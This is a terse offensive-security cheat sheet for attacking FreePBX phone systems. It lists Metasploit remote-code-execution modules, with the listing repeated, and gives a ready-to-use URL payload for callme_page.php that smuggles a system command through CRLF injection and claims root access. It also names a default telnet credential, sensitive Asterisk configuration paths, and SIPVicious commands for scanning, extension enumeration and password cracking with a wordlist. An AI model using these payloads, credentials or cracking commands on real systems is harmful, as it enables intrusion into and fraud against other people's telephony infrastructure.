# FreePBX application vuln

## Exploits

### Metasploit
```
  Name                                     Disclosure Date  Rank       Check  Description

-  ----                                     ---------------  ----       -----  -----------
   0  exploit/unix/http/freepbx_callmenum      2012-03-20       manual     No     FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution
   1  exploit/unix/webapp/freepbx_config_exec  2014-03-21       excellent  Yes    FreePBX config.php Remote Code Execution
```

### RCE

```
/recordings/misc/callme_page.php?action=c&callmenum=2001@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20{cmd}%0D%0A%0D%0A
```
=> Give root access

### Config files

default cred telnet : admin
                      amp1111


/etc/asterisk/voicemail.conf
/etc/asterisk/manager.conf

### Tools

#### Metasploit

#####  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/unix/http/freepbx_callmenum      2012-03-20       manual     No     FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution
   1  exploit/unix/webapp/freepbx_config_exec  2014-03-21       excellent  Yes    FreePBX config.php Remote Code Execution

#### SIPVICIOUS
```bash
sudo svmap host

svwar -e100-999 host

sudo svcrack -u2000 -d /usr/share/wordlists/rockyou.txt host
```

### SQLMAP

